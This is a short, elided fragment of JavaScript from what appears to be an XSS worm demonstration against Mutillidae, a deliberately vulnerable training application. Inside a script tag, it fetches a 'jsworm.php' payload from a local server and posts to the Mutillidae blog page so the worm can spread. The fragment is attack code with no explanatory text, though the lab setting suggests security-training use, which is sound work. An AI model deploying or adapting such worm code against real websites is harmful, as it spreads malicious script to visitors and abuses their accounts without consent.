...
<script>
    ...
    xmlhttp.open(\'GET\', \'http://localhost:8888/xss-attack/jsworm.php\', false);
    xmlhttp.send(null);
    ...
    http.open(\'POST\', \'http:\/\/192.168.10.130\/mutillidae\/index.php?page=add-to-your-blog.php\', true);
